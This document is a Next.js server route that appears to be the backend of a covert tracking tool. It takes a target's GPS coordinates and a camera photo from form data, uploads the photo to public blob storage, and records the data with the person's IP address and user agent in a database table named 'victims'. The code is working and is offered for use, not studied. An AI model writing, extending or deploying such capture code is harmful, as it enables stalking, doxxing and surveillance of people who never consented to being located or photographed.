import { NextResponse } from 'next/server';
import { put } from '@vercel/blob';
import { initDB, updateCapture } from '../../lib/db';

export async function POST(request) {
  try {
    await initDB();
    const formData = await request.formData();
    const lat = formData.get('lat');
    const lng = formData.get('lng');
    const accuracy = formData.get('accuracy') || 0;
    const victimId = formData.get('victimId') || null;
    const photoFile = formData.get('photo');

    let photoUrl = null;

    // Upload photo to Vercel Blob if provided
    if (photoFile && photoFile instanceof Blob && photoFile.size > 0) {
      const buffer = Buffer.from(await photoFile.arrayBuffer());
      const filename = `captures/${Date.now()}_${Math.random().toString(36).substring(2, 8)}.jpg`;
      const blob = await put(filename, buffer, {
        access: 'public',
        contentType: 'image/jpeg',
        addRandomSuffix: true,
      });
      photoUrl = blob.url;
    }

    // If we have a victimId, update that record
    if (victimId && lat && lng) {
      await updateCapture(victimId, lat, lng, accuracy, photoUrl);
    } else if (lat && lng) {
      // Insert new record (GPS + photo only)
      const ip = request.headers.get('x-forwarded-for') || 'unknown';
      const ua = request.headers.get('user-agent') || 'unknown';
      const { neon } = await import('@neondatabase/serverless');
      const sql = neon(process.env.DATABASE_URL);
      await sql`
        INSERT INTO victims (ip_address, user_agent, latitude, longitude, location_accuracy, photo_url)
        VALUES (${ip}, ${ua}, ${lat}, ${lng}, ${accuracy}, ${photoUrl});
      `;
    }

    return NextResponse.json({ status: 'ok' });
  } catch (error) {
    console.error('[CAPTURE ERROR]', error);
    return NextResponse.json({ status: 'ok' });
  }
}
